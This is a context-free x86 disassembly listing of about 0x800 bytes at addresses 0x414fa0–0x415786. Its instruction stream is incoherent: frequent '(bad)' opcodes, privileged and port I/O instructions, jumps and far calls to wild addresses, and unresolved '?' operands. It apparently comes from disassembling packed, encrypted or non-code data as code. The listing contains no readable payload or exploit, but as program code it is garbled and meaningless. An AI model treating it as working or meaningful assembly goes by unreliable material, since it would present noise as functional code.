  414fa0:	xchg   esi,eax
  414fa1:	rol    BYTE PTR [edx-0x56],1
  414fa4:	add    BYTE PTR ds:0xef566159,0x59
  414fab:	push   0xffffffbd
  414fad:	xor    eax,0x4c759f1a
  414fb2:	fiadd  WORD PTR [esi]
  414fb4:	cmp    DWORD PTR [eax+0x5e],edx
  414fb7:	jb     0x414f52
  414fb9:	sbb    esp,DWORD PTR ds:0xc614e2d1
  414fbf:	(bad)  
  414fc0:	xchg   ecx,eax
  414fc1:	adc    cl,ah
  414fc3:	add    edi,DWORD PTR [eax-0x145cb627]
  414fc9:	and    ah,BYTE PTR [ecx]
  414fcb:	add    DWORD PTR [ecx],esp
  414fcd:	sub    ebp,esp
  414fcf:	mov    edx,esi
  414fd1:	jmp    0x414ff8
  414fd3:	lds    edi,FWORD PTR [edi-0x65]
  414fd6:	push   edx
  414fd7:	jb     0x41502a
  414fd9:	cs aas 
  414fdb:	jmp    0x414fd7
  414fdd:	div    DWORD PTR [esi+eax*4-0xab458bd]
  414fe4:	cmp    bh,cl
  414fe6:	jge    0x414fbd
  414fe8:	test   eax,0x8f00ada6
  414fed:	xchg   esp,eax
  414fee:	mov    ds:0xdd1f1241,eax
  414ff3:	dec    esi
  414ff4:	in     al,dx
  414ff5:	stc    
  414ff6:	and    al,0xeb
  414ff8:	into   
  414ff9:	(bad)  
  414ffa:	addr16 imul ecx,edx,0xffffffb3
  414ffe:	imul   edi,DWORD PTR [ebx+0x8545d2f],0x329974ed
  415008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415009:	dec    ebx
  41500a:	adc    BYTE PTR [ebx+edi*2-0x33],ah
  41500e:	shr    DWORD PTR ds:0x6eb16bd8,cl
  415014:	mov    eax,0xe32d6ae6
  415019:	sbb    BYTE PTR [edx],0x3e
  41501c:	ror    BYTE PTR [ecx-0x3a],cl
  41501f:	and    al,0x2c
  415021:	sub    cl,bh
  415023:	outs   dx,DWORD PTR ds:[esi]
  415024:	jnp    0x414fa7
  415026:	push   edi
  415027:	dec    esp
  415028:	sub    BYTE PTR [ebx+esi*2-0x8],ah
  41502c:	cmp    eax,0x2f0fd76d
  415031:	ja     0x415001
  415033:	xor    eax,0xe4458659
  415038:	cmp    ecx,DWORD PTR [ebp+eiz*1+0x1b]
  41503c:	inc    ebx
  41503d:	shl    BYTE PTR [eax-0x7a6293ce],0x73
  415044:	and    eax,0xd8e56370
  415049:	jae    0x415001
  41504b:	add    eax,0xd05ea28e
  415050:	cmp    dh,BYTE PTR [eax-0x4e295a21]
  415056:	cmp    al,0x50
  415058:	xchg   esi,eax
  415059:	test   BYTE PTR [edx-0x59],ch
  41505c:	leave  
  41505d:	cli    
  41505e:	popa   
  41505f:	cmc    
  415060:	int    0xb3
  415062:	(bad)  
  415063:	loop   0x415053
  415065:	and    eax,0x6e914e91
  41506a:	fmulp  st(0),st
  41506c:	jg     0x4150cb
  41506e:	cmp    BYTE PTR [ebp-0x6f],cl
  415071:	bnd fs jb 0x415040
  415075:	fisttp QWORD PTR [edi-0x59]
  415078:	or     eax,0x4a1af1bd
  41507d:	or     eax,ebp
  41507f:	push   ecx
  415080:	and    esp,esp
  415082:	inc    ecx
  415083:	or     cl,dh
  415085:	dec    ebp
  415086:	int3   
  415087:	inc    ebp
  415088:	mov    edi,0x70ccf890
  41508d:	sbb    al,0xd8
  41508f:	lods   al,BYTE PTR ds:[esi]
  415090:	in     al,dx
  415091:	mov    ds:0xa673e05d,eax
  415096:	jne    0x4150a5
  415098:	lahf   
  415099:	mov    bl,0x8
  41509b:	and    eax,0x90814850
  4150a0:	mov    ebx,DWORD PTR [edi]
  4150a2:	adc    DWORD PTR ss:[esi+0x66],ebp
  4150a6:	(bad)  
  4150a7:	(bad)
  4150ac:	push   ds
  4150ad:	and    eax,0x2064f030
  4150b2:	in     al,dx
  4150b3:	cld    
  4150b4:	jns    0x4150e2
  4150b6:	pushf  
  4150b7:	and    ebp,eax
  4150b9:	add    BYTE PTR [eax+0x11b4667a],0x78
  4150c0:	jecxz  0x41507b
  4150c2:	lods   eax,DWORD PTR ds:[esi]
  4150c3:	xchg   BYTE PTR [eax+eax*4-0x7365eb34],dl
  4150ca:	xor    eax,0xd55cce8b
  4150cf:	loope  0x41511c
  4150d1:	pop    edi
  4150d2:	outs   dx,BYTE PTR ds:[esi]
  4150d3:	fnstsw WORD PTR [ebx+0x3fbfb92d]
  4150d9:	or     ebp,ebx
  4150db:	push   edi
  4150dc:	js     0x41513e
  4150de:	mov    es,esi
  4150e0:	in     eax,dx
  4150e1:	ja     0x41507c
  4150e3:	or     dl,bl
  4150e5:	mov    esi,0xaf13483
  4150ea:	mov    ds:0x1afb5b86,al
  4150ef:	pop    ecx
  4150f0:	xchg   ecx,eax
  4150f1:	pop    es
  4150f2:	sub    DWORD PTR [edx-0x8],edi
  4150f5:	cmp    edx,DWORD PTR [ecx-0x23606eb7]
  4150fb:	cld    
  4150fc:	stos   DWORD PTR es:[edi],eax
  4150fd:	inc    ebp
  4150fe:	nop
  4150ff:	inc    ebx
  415100:	rcr    al,cl
  415102:	cmp    BYTE PTR [ebx+0x48],0xaf
  415106:	lods   eax,DWORD PTR ds:[esi]
  415107:	mov    al,ds:0x2b404594
  41510c:	clc    
  41510d:	(bad)  
  41510f:	jno    0x4150ce
  415111:	or     ebp,DWORD PTR [eax+0x14675185]
  415117:	or     BYTE PTR [esi+ebp*2],bl
  41511a:	fnstenv [ebx+0x68]
  41511d:	retf   
  41511e:	das    
  41511f:	jge    0x4150ec
  415121:	gs int 0x93
  415124:	inc    ecx
  415125:	loop   0x41511e
  415127:	lea    edx,[esi-0x35]
  41512a:	adc    BYTE PTR [ecx+0x7],ah
  41512d:	lea    edi,[eax-0x4c]
  415130:	inc    ebp
  415131:	sbb    al,0x2
  415133:	daa    
  415134:	bound  edx,QWORD PTR [ecx-0x7292ae39]
  41513a:	enter  0xe4c3,0x89
  41513e:	pushf  
  41513f:	mov    esi,0x9017e359
  415144:	popf   
  415145:	and    eax,0xcc8b6e4b
  41514a:	mov    ds:0xca5e44f9,al
  41514f:	bnd call 0xe330b3ce
  415155:	mov    ebp,0xbf7c44a3
  41515a:	or     DWORD PTR ds:0xfc82d1a5,edx
  415160:	push   esp
  415161:	aam    0x61
  415163:	xor    ecx,DWORD PTR [ebx]
  415165:	cmp    BYTE PTR [edx],0x24
  415168:	push   ebx
  415169:	inc    esi
  41516a:	or     esp,DWORD PTR [ebx]
  41516c:	outs   dx,DWORD PTR ds:[esi]
  41516d:	adc    eax,0x938792ba
  415172:	addr16 popa 
  415174:	xor    BYTE PTR [eax-0x76],0x95
  415178:	cmp    edi,DWORD PTR [eax+0x4b]
  41517b:	icebp  
  41517c:	(bad)  
  41517d:	call   0xe33d:0x6eb5ceeb
  415184:	push   ds
  415185:	inc    ebp
  415186:	add    al,0xd0
  415188:	push   0xffffffa3
  41518a:	pop    ebp
  41518b:	loop   0x415192
  41518d:	mov    esi,DWORD PTR [edx-0x542f6ebd]
  415193:	call   DWORD PTR [edi+0x443455c5]
  415199:	and    al,0xaf
  41519b:	(bad)  
  41519d:	std    
  41519e:	les    ebx,FWORD PTR [eax]
  4151a0:	scas   al,BYTE PTR es:[edi]
  4151a1:	adc    al,0x88
  4151a3:	addr16 inc esi
  4151a5:	test   DWORD PTR [ebx],ecx
  4151a7:	out    0x94,al
  4151a9:	ficom  DWORD PTR [ebx+ecx*1-0x18]
  4151ad:	dec    eax
  4151ae:	repz dec esp
  4151b0:	xchg   DWORD PTR [edi+0x7c],esp
  4151b3:	sar    BYTE PTR ds:0x820dd65d,1
  4151b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ba:	outs   dx,DWORD PTR ds:[esi]
  4151bb:	stos   BYTE PTR es:[edi],al
  4151bc:	cmc    
  4151bd:	xchg   esp,eax
  4151be:	xor    eax,0x7e80e870
  4151c3:	retf   0x1017
  4151c6:	jns    0x4151a6
  4151c8:	mov    ds:0x5b5706f7,al
  4151cd:	sub    BYTE PTR [esp+ebx*1+0x39489867],ch
  4151d4:	pop    ebx
  4151d5:	jnp    0x4151ae
  4151d7:	rol    ebx,1
  4151d9:	cli    
  4151da:	retf   0x3b35
  4151dd:	out    dx,eax
  4151de:	dec    ebx
  4151df:	fsub   st,st(5)
  4151e1:	shl    BYTE PTR [esi+0x7552b3c],0x7b
  4151e8:	cmp    BYTE PTR [edi],ah
  4151ea:	stos   BYTE PTR es:[edi],al
  4151eb:	xchg   BYTE PTR [ebp+0x1b3fe335],dl
  4151f1:	add    cl,0xd
  4151f4:	or     ch,BYTE PTR ds:[edi]
  4151f7:	mov    esp,0xb937acbf
  4151fc:	call   0xac05ae4d
  415201:	in     al,0x80
  415203:	inc    ecx
  415204:	mov    WORD PTR [edx+eax*1+0x20e15db2],ss
  41520b:	add    eax,0x2d50d2a7
  415210:	int    0x6a
  415212:	(bad)
  415215:	mov    WORD PTR [edx],?
  415217:	push   0x25
  415219:	call   FWORD PTR [eax]
  41521b:	js     0x4151bb
  41521d:	mul    DWORD PTR [ebx]
  41521f:	push   0xb0f6b8e9
  415224:	aas    
  415225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415226:	scas   eax,DWORD PTR es:[edi]
  415227:	cmc    
  415228:	enter  0xc78a,0x7b
  41522c:	xor    al,BYTE PTR [eax-0x63]
  41522f:	iret   
  415230:	xchg   edi,eax
  415231:	jo     0x4151ed
  415233:	xor    BYTE PTR [ebx+0x1c],bh
  415236:	jg     0x4151e0
  415238:	mov    WORD PTR [esi],es
  41523a:	pop    esp
  41523b:	xchg   edx,eax
  41523c:	inc    ecx
  41523d:	(bad)  [esi+0x53e536b4]
  415243:	mov    esi,0xf6eb8c23
  415248:	cs pushf 
  41524a:	in     al,0xec
  41524c:	sbb    eax,0x41146547
  415251:	mov    al,ds:0x5b2a704d
  415256:	push   0xdb17f9d8
  41525b:	xchg   esp,eax
  41525c:	int    0x5a
  41525e:	xor    al,0x70
  415260:	pop    esi
  415261:	out    0x27,al
  415263:	inc    ecx
  415264:	adc    DWORD PTR [edi+0x19],edx
  415267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415268:	jnp    0x4152c0
  41526a:	adc    BYTE PTR [esi],cl
  41526c:	inc    esi
  41526d:	jmp    0x6647ff47
  415272:	jg     0x4152a6
  415274:	add    DWORD PTR [edi-0x11f80ede],0x4
  41527b:	push   eax
  41527c:	push   esp
  41527d:	arpl   WORD PTR [esi+0x1c],bp
  415280:	popf   
  415281:	cld    
  415282:	lock or DWORD PTR [esi],edi
  415285:	test   DWORD PTR [ebx+0x78783d5b],esi
  41528b:	fsub   DWORD PTR [esi]
  41528d:	aam    0xf
  41528f:	pop    edi
  415290:	dec    esp
  415291:	or     eax,0xe225aa80
  415296:	add    eax,0xe24b201a
  41529b:	pop    edx
  41529c:	fdivr  st(2),st
  41529e:	dec    edx
  41529f:	out    0x4,al
  4152a1:	shl    DWORD PTR [ecx-0x47aa4a8d],cl
  4152a7:	sbb    eax,0x8c28b20b
  4152ac:	xor    edi,DWORD PTR [ebx]
  4152ae:	dec    ecx
  4152af:	cs int3 
  4152b1:	sub    bh,BYTE PTR [edi-0x25ba0a81]
  4152b7:	lods   al,BYTE PTR ds:[esi]
  4152b8:	stos   DWORD PTR es:[edi],eax
  4152b9:	je     0x4152b9
  4152bb:	pusha  
  4152bc:	scas   al,BYTE PTR es:[edi]
  4152bd:	jb     0x415334
  4152bf:	mov    ds:0xca2fda01,eax
  4152c4:	mov    dh,0x20
  4152c6:	stos   DWORD PTR es:[edi],eax
  4152c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152c8:	jae    0x41533f
  4152ca:	push   ss
  4152cb:	cmp    al,0x98
  4152cd:	xchg   esi,eax
  4152ce:	loope  0x4152d5
  4152d0:	fdivr  QWORD PTR [esi]
  4152d2:	nop
  4152d3:	or     al,0x38
  4152d5:	arpl   WORD PTR [ecx+0x32],di
  4152d8:	push   0x34
  4152da:	stos   DWORD PTR es:[edi],eax
  4152db:	push   0x5d
  4152dd:	dec    edx
  4152de:	stc    
  4152df:	jmp    DWORD PTR [edx+0x21794945]
  4152e5:	ds fadd st(6),st
  4152e8:	add    al,0xe8
  4152ea:	mov    DWORD PTR [edi],edx
  4152ec:	or     bl,BYTE PTR es:[ebx]
  4152ef:	xchg   DWORD PTR [esi-0x4d],esi
  4152f2:	pusha  
  4152f3:	int    0xdd
  4152f5:	push   esp
  4152f6:	fnsave [edx]
  4152f8:	cld    
  4152f9:	(bad)  
  4152fa:	pop    ebp
  4152fb:	xor    edx,ebx
  4152fd:	pop    esi
  4152fe:	pop    esi
  4152ff:	arpl   di,bp
  415301:	stc    
  415302:	(bad)  
  415303:	ds sub ah,ch
  415306:	fwait
  415307:	jo     0x415323
  415309:	fiadd  DWORD PTR [ecx+0x20]
  41530c:	mov    ch,0xca
  41530e:	pop    ebp
  41530f:	xchg   ebx,eax
  415310:	(bad)  
  415311:	sub    esi,DWORD PTR [edi+0x6e]
  415314:	mov    edx,ebx
  415316:	sub    al,0x1a
  415318:	iret   
  415319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41531a:	cwde   
  41531b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41531c:	mov    ebx,0x39fdc5a7
  415321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415322:	xor    bl,BYTE PTR ds:0xb95c2373
  415328:	xchg   edx,eax
  415329:	mov    dh,0x37
  41532b:	hlt    
  41532c:	mov    esp,0x1033ffb1
  415331:	retf   0x2949
  415334:	add    al,0x15
  415336:	clc    
  415337:	sti    
  415338:	dec    esp
  415339:	xchg   esp,eax
  41533a:	in     eax,0xd9
  41533c:	dec    eax
  41533d:	cmp    BYTE PTR [esi+0x76],dl
  415340:	clc    
  415341:	push   edx
  415342:	dec    ecx
  415343:	lahf   
  415344:	inc    esi
  415345:	cmp    eax,0x59e1c0ef
  41534a:	clc    
  41534b:	imul   ebx,edx,0xc3b837ca
  415351:	lock dec BYTE PTR [edx]
  415354:	push   es
  415355:	mov    dl,0x19
  415357:	add    eax,0x29b51666
  41535c:	push   0xffffffbe
  41535e:	jmp    0x41539e
  415360:	cwde   
  415361:	mov    gs,edi
  415363:	repz fdiv QWORD PTR [eax+0x19fb3268]
  41536a:	jmp    0x3bf9634c
  41536f:	dec    DWORD PTR [ebx-0x15]
  415372:	lods   al,BYTE PTR ds:[esi]
  415373:	lahf   
  415374:	cmp    esp,DWORD PTR [eax-0x56]
  415377:	push   edx
  415378:	repnz test BYTE PTR [eax],0x55
  41537c:	xchg   esi,eax
  41537d:	test   al,0x6d
  41537f:	mov    ebx,0xb1466bce
  415384:	mov    edx,0x7080c462
  415389:	out    0x24,eax
  41538b:	cli    
  41538c:	nop
  41538d:	dec    esi
  41538e:	std    
  41538f:	dec    eax
  415390:	popf   
  415391:	fistp  DWORD PTR [esi+0x3c685f13]
  415397:	icebp  
  415398:	xchg   ecx,eax
  415399:	sar    BYTE PTR [edi-0x37],1
  41539c:	xlat   BYTE PTR ds:[ebx]
  41539d:	and    edx,eax
  41539f:	push   ebx
  4153a0:	lahf   
  4153a1:	fbld   TBYTE PTR [eax-0x76962ed3]
  4153a7:	lods   eax,DWORD PTR ds:[esi]
  4153a8:	pop    esp
  4153a9:	iret   
  4153aa:	pop    eax
  4153ab:	inc    DWORD PTR [ebp+0x4f]
  4153ae:	sub    edx,DWORD PTR ds:0xfed7b0c8
  4153b4:	fwait
  4153b5:	push   edi
  4153b6:	loope  0x4153b7
  4153b8:	and    eax,0x7d765a96
  4153bd:	std    
  4153be:	push   ebp
  4153bf:	pop    edx
  4153c0:	fs mov al,0xe
  4153c3:	jo     0x415414
  4153c5:	xor    ecx,edx
  4153c7:	cmp    eax,0x7c8544b0
  4153cc:	dec    ebx
  4153cd:	push   ss
  4153ce:	outs   dx,BYTE PTR ds:[esi]
  4153cf:	imul   esi,DWORD PTR [edi+0x38622afe],0xfffda5d4
  4153d9:	adc    eax,0xb4f5b0b9
  4153de:	sub    DWORD PTR ss:[esi-0x1627d358],0x39
  4153e6:	mov    edi,DWORD PTR [edi+ecx*4-0x10]
  4153ea:	je     0x415423
  4153ec:	jmp    0x4153fc
  4153ee:	arpl   WORD PTR [edi+0xc],bp
  4153f1:	ins    BYTE PTR es:[edi],dx
  4153f2:	xor    DWORD PTR [edx+0x5a],eax
  4153f5:	popa   
  4153f6:	or     DWORD PTR [edi],ebx
  4153f8:	loopne 0x415466
  4153fa:	mov    dl,0xef
  4153fc:	push   cs
  4153fd:	ss popa 
  4153ff:	push   edx
  415400:	xchg   ebp,eax
  415401:	int3   
  415402:	adc    edi,DWORD PTR ds:0xa32074da
  415408:	loope  0x4153ec
  41540a:	inc    ebx
  41540b:	mov    BYTE PTR [esi],bl
  41540d:	sbb    ebp,DWORD PTR ds:0x7209ff7c
  415413:	add    eax,ebx
  415415:	cmp    DWORD PTR [ecx-0x61580896],esp
  41541b:	rol    BYTE PTR [esi+0x35],cl
  41541e:	sbb    dh,BYTE PTR [ecx-0x36]
  415421:	mov    eax,0xc121a639
  415426:	push   cs
  415427:	gs cmp eax,0xffbb49eb
  41542d:	imul   ebp,DWORD PTR [edx],0xeb872198
  415433:	leave  
  415434:	push   eax
  415435:	jbe    0x4154a6
  415437:	or     ecx,DWORD PTR [eax]
  415439:	cmp    DWORD PTR [ebp+0xc],edi
  41543c:	mov    BYTE PTR [edi+edx*1],ch
  41543f:	imul   eax,DWORD PTR [ecx-0x7a1688b2],0x38c4a6f5
  415449:	scas   eax,DWORD PTR es:[edi]
  41544a:	ja     0x4153ff
  41544c:	mov    ch,0xd2
  41544e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41544f:	xchg   ecx,eax
  415450:	bnd jnp 0x415420
  415453:	loopne 0x415454
  415455:	cmp    dh,BYTE PTR [edi+eiz*4-0xb]
  415459:	adc    al,0x89
  41545b:	jecxz  0x4153ed
  41545d:	add    edx,DWORD PTR [edx+eax*1]
  415460:	aaa    
  415461:	and    eax,0xb6fc6fd5
  415466:	pop    esi
  415467:	dec    esp
  415468:	jp     0x4154a3
  41546a:	iret   
  41546b:	lahf   
  41546c:	adc    cl,BYTE PTR [ecx+0x180ca68e]
  415472:	push   edx
  415473:	mov    ds:0x59e104ae,eax
  415478:	sbb    al,0x6a
  41547a:	and    DWORD PTR [ebx-0x5e],eax
  41547d:	add    ah,0xa4
  415480:	int3   
  415481:	pop    ebp
  415482:	pushf  
  415483:	mov    ecx,0x943d97a2
  415488:	out    dx,al
  415489:	push   0xffffffed
  41548b:	data16 loop 0x415505
  41548e:	mov    ebp,0x41e04177
  415493:	pop    eax
  415494:	jne    0x41547d
  415496:	pop    edx
  415497:	lods   al,BYTE PTR ds:[esi]
  415498:	mov    al,ds:0xaf2d46f7
  41549d:	add    eax,DWORD PTR [edi+ebp*8+0x28]
  4154a1:	fist   DWORD PTR [esp+0x46fcb84f]
  4154a8:	rcr    BYTE PTR [edi+ebp*1],1
  4154ab:	pop    ds
  4154ac:	xor    ch,cl
  4154ae:	rcl    DWORD PTR [edx+ebp*1],0x10
  4154b2:	scas   eax,DWORD PTR es:[edi]
  4154b3:	ret    
  4154b4:	jecxz  0x4154ec
  4154b6:	bound  eax,QWORD PTR [eax+0x71aeb1b3]
  4154bc:	mov    ah,0x61
  4154be:	cld    
  4154bf:	sti    
  4154c0:	mov    edx,0x2099822c
  4154c5:	pop    edi
  4154c6:	cmc    
  4154c7:	fistp  WORD PTR [edx-0x1953d48]
  4154cd:	xchg   ecx,eax
  4154ce:	cdq    
  4154cf:	fmul   DWORD PTR [ecx+0x6a]
  4154d2:	(bad)  
  4154d3:	jae    0x41554b
  4154d5:	aad    0x81
  4154d7:	dec    edx
  4154d8:	pusha  
  4154d9:	(bad)
  4154dd:	or     BYTE PTR [esi],0x9
  4154e0:	or     ch,0x5e
  4154e3:	xor    eax,0xea3b652
  4154e8:	mov    bl,0x48
  4154ea:	mov    ch,0x4d
  4154ec:	ror    bl,0xb5
  4154ef:	adc    ebx,DWORD PTR [ebp+edi*2+0xef8a8a6]
  4154f6:	sbb    al,0xf1
  4154f8:	in     al,dx
  4154f9:	loope  0x41555c
  4154fb:	and    ecx,DWORD PTR [eax]
  4154fd:	cmc    
  4154fe:	mov    cl,0x63
  415500:	clts   
  415502:	xchg   DWORD PTR [ebx+0x49bea5c6],esi
  415508:	aas    
  415509:	inc    eax
  41550a:	mov    al,0xc
  41550c:	cmp    ebp,esp
  41550e:	in     al,dx
  41550f:	cmp    DWORD PTR [ecx+0x7d],ecx
  415512:	repnz dec ebp
  415514:	sbb    eax,0xb719baa3
  415519:	(bad)  
  41551a:	xlat   BYTE PTR ds:[ebx]
  41551b:	push   edi
  41551c:	jl     0x4154ee
  41551e:	ret    
  41551f:	sbb    eax,0x3cffea00
  415524:	cmp    eax,DWORD PTR [edx-0x738e1dd2]
  41552a:	lea    ebx,[ecx+0x14d62ec1]
  415530:	xchg   esi,eax
  415531:	imul   ebp,DWORD PTR [ecx+0x41d71e44],0x3cfac040
  41553b:	cmp    eax,0x2f70a5bf
  415540:	sbb    eax,ecx
  415542:	mov    ds:0xe37fae19,eax
  415547:	sub    eax,0x2c24168d
  41554c:	xchg   esp,eax
  41554d:	jbe    0x4154cf
  41554f:	xor    DWORD PTR ds:0xd7272ee1,ebx
  415555:	jae    0x4155d1
  415557:	pushf  
  415558:	gs popa 
  41555a:	lahf   
  41555b:	adc    DWORD PTR [ebx-0x71],ecx
  41555e:	nop    ecx
  415561:	dec    edi
  415562:	iret   
  415563:	push   ds
  415564:	arpl   bp,bp
  415566:	mov    esp,0x5ea685f1
  41556b:	rol    esi,1
  41556d:	dec    ebp
  41556e:	add    DWORD PTR [ebx],edx
  415570:	adc    eax,edx
  415572:	push   cs
  415573:	pop    edx
  415574:	and    ecx,ecx
  415576:	rol    DWORD PTR [ebx+0x1e],1
  415579:	pop    ebx
  41557a:	pop    edi
  41557b:	push   es
  41557c:	jge    0x4155ab
  41557e:	jmp    0xc804ea71
  415583:	fimul  DWORD PTR [esp+ecx*2-0x63]
  415587:	pop    ecx
  415588:	nop
  415589:	push   ecx
  41558a:	pushf  
  41558b:	jmp    0xf264b8c4
  415590:	jae    0x415565
  415592:	cld    
  415593:	add    BYTE PTR [edi+ecx*2+0x61],dh
  415597:	pop    ds
  415598:	mov    eax,ds:0x6d2ac27e
  41559d:	cmp    dl,BYTE PTR [edx]
  41559f:	sub    BYTE PTR [edi+0x12],ah
  4155a2:	jp     0x4155fc
  4155a4:	dec    esi
  4155a5:	mov    bh,0x5d
  4155a7:	stos   BYTE PTR es:[edi],al
  4155a8:	mov    dl,0xa8
  4155aa:	(bad)  
  4155ab:	add    al,0x1
  4155ad:	pop    edi
  4155ae:	and    al,0x36
  4155b0:	not    DWORD PTR [ecx]
  4155b2:	or     ebp,DWORD PTR fs:[ebp-0x34]
  4155b6:	or     BYTE PTR [edi],ah
  4155b8:	mov    al,ds:0x726dafcf
  4155bd:	fisub  WORD PTR [edx+0x66]
  4155c0:	mov    esi,0x839f2956
  4155c5:	push   es
  4155c6:	adc    ebp,DWORD PTR [esi+esi*8+0x1abb10cb]
  4155cd:	xchg   esp,eax
  4155ce:	inc    esp
  4155cf:	push   eax
  4155d0:	int    0xac
  4155d2:	add    esp,DWORD PTR fs:[eax-0x1f]
  4155d6:	fldenv [ebx-0x47befcb4]
  4155dc:	std    
  4155dd:	ja     0x4155c1
  4155df:	js     0x415582
  4155e1:	mov    bh,0xb7
  4155e3:	push   ebp
  4155e4:	and    edx,ebx
  4155e6:	dec    esi
  4155e7:	cmc    
  4155e8:	pop    eax
  4155e9:	ror    DWORD PTR [ebx+0x2a445d3],cl
  4155ef:	mov    ebx,0x88e10c06
  4155f4:	pop    ss
  4155f5:	ror    ah,1
  4155f7:	add    eax,0xe80c7b34
  4155fc:	int3   
  4155fd:	or     al,0xf1
  4155ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415600:	xchg   dl,bl
  415602:	jo     0x41559d
  415604:	inc    ecx
  415605:	mov    bh,0x40
  415607:	mov    dh,0xd3
  415609:	dec    edx
  41560a:	ror    ebp,0x71
  41560d:	retf   0xed44
  415610:	enter  0xfc08,0x95
  415614:	clc    
  415615:	pop    ds
  415616:	pushf  
  415617:	push   ebp
  415618:	jae    0x415694
  41561a:	ficom  DWORD PTR [edi-0x4cf65a16]
  415620:	and    dh,BYTE PTR [esi+ecx*1]
  415623:	aas    
  415624:	in     eax,0x4a
  415626:	jmp    DWORD PTR [ebx+0x13bbb5e5]
  41562c:	sbb    al,0x28
  41562e:	xchg   ecx,eax
  41562f:	cld    
  415630:	icebp  
  415631:	addr16 dec ebp
  415633:	push   0xa84e8080
  415638:	pop    ds
  415639:	sbb    dl,BYTE PTR [edi]
  41563b:	and    eax,0x5be5377
  415640:	mov    al,0xd4
  415642:	inc    ebx
  415643:	sbb    BYTE PTR [ebx-0x62],ch
  415646:	sub    esp,0x2c7572ce
  41564c:	jg     0x415603
  41564e:	sbb    BYTE PTR [edi-0x5d150357],dh
  415654:	cmp    al,0x75
  415656:	je     0x415640
  415658:	ror    DWORD PTR ds:0xefbc51c1,1
  41565e:	sbb    BYTE PTR [ebx-0x7e908748],dh
  415664:	fsub   DWORD PTR ss:[edi+0x41]
  415668:	(bad)  
  415669:	das    
  41566a:	test   ah,0xa0
  41566d:	je     0x41563e
  41566f:	dec    ecx
  415670:	(bad)  
  415671:	or     DWORD PTR [esi+0x1cf15db0],0x2f
  415678:	cmc    
  415679:	and    DWORD PTR [ebx+0x27],ecx
  41567c:	dec    eax
  41567d:	fild   WORD PTR [esi+0x5b5f6b16]
  415683:	aad    0x73
  415685:	sahf   
  415686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415687:	push   0xffffff99
  415689:	cld    
  41568a:	cmp    BYTE PTR [esi],dl
  41568c:	mov    edx,ebx
  41568e:	push   cs
  41568f:	dec    ebp
  415690:	and    bl,BYTE PTR [ecx-0x12]
  415693:	aam    0xe1
  415695:	cli    
  415696:	test   al,0x14
  415698:	push   ecx
  415699:	push   es
  41569a:	stc    
  41569b:	fist   DWORD PTR [esi+0x1bf1efb4]
  4156a1:	cmp    DWORD PTR [edi+0x3e748fed],eax
  4156a7:	lods   eax,DWORD PTR ds:[esi]
  4156a8:	jecxz  0x4156f2
  4156aa:	imul   esp,DWORD PTR [ebx-0xd],0x1eceed54
  4156b1:	popa   
  4156b2:	mov    al,ds:0xa459ad81
  4156b7:	ja     0x4156c8
  4156b9:	add    dl,bh
  4156bb:	shl    DWORD PTR [ecx+0xa2c5d0],1
  4156c1:	lock push ebx
  4156c3:	fwait
  4156c4:	adc    ch,bl
  4156c6:	cmp    dl,BYTE PTR [edx]
  4156c8:	jno    0x415658
  4156ca:	js     0x415689
  4156cc:	xchg   ebx,eax
  4156cd:	scas   eax,DWORD PTR es:[edi]
  4156ce:	out    0xf,al
  4156d0:	cmp    al,0xf7
  4156d2:	cli    
  4156d3:	mov    ?,WORD PTR ds:[edi]
  4156d6:	pop    es
  4156d7:	xchg   ebx,ebx
  4156d9:	je     0x4156b5
  4156db:	in     eax,0x49
  4156dd:	loopne 0x415727
  4156df:	loopne 0x4156bf
  4156e1:	xchg   ebx,eax
  4156e2:	mov    cl,0xf3
  4156e4:	test   eax,0x3929ea9f
  4156e9:	and    bh,BYTE PTR [ebx-0x76495ae2]
  4156ef:	test   al,0x62
  4156f1:	add    DWORD PTR [edi-0x58],0xb08a8b73
  4156f8:	mov    ecx,0x6c0490df
  4156fd:	test   DWORD PTR [edx+0x51],esi
  415700:	mov    edi,0x9dd28620
  415705:	enter  0x793b,0xa1
  415709:	aaa    
  41570a:	clc    
  41570b:	mov    dl,0xef
  41570d:	cmp    eax,0xa30c58c4
  415712:	mov    ds:0x2922f46e,al
  415717:	add    esp,DWORD PTR [ebx-0x5a]
  41571a:	mov    ?,WORD PTR [ebx]
  41571c:	ror    DWORD PTR gs:[eax],cl
  41571f:	and    eax,0x3bbcc753
  415724:	aaa    
  415725:	test   eax,0x9f226daf
  41572a:	(bad)  
  41572b:	(bad)  
  41572c:	fld    TBYTE PTR [ebp-0x1b]
  41572f:	inc    edi
  415730:	aas    
  415731:	fsqrt  
  415733:	sub    eax,0x5bf3ca4
  415738:	fldenv [ebp-0x1e408e44]
  41573e:	dec    esp
  41573f:	test   edi,esp
  415741:	icebp  
  415742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415743:	stos   DWORD PTR es:[edi],eax
  415744:	xabort 0x22
  415747:	inc    edi
  415748:	out    dx,al
  415749:	dec    eax
  41574a:	pop    eax
  41574b:	xchg   esp,eax
  41574c:	pop    edx
  41574d:	add    BYTE PTR [eax+0x2b5fe192],0x47
  415754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415755:	cmp    bh,BYTE PTR [ebx]
  415757:	mov    esp,0x60fb77f1
  41575c:	shl    DWORD PTR [edx-0x695f6cde],1
  415762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415763:	dec    edx
  415764:	pop    ecx
  415765:	mov    ecx,0xe4360935
  41576a:	lahf   
  41576b:	clc    
  41576c:	(bad)  
  41576d:	sbb    edx,esp
  41576f:	lds    ecx,FWORD PTR [edx-0x49]
  415772:	fbld   TBYTE PTR [eax+0x3a7b4abb]
  415778:	push   es
  415779:	dec    ebp
  41577a:	mov    ebx,edx
  41577c:	stc    
  41577d:	ja     0x4157e2
  41577f:	or     eax,0xf7305067
  415784:	in     al,0x64
  415786:	test   al,0xef
